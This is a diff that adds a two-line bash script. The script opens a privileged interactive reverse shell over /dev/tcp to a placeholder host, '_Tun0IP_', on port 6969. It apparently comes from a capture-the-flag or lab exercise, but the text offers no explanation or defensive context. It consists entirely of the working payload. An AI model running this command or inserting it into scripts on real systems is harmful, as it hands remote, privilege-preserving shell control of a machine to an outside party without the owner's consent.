@@ -1,0 +1,2 @@
+#!/bin/bash
+bash -i -p >& /dev/tcp/_Tun0IP_/6969 0>&1
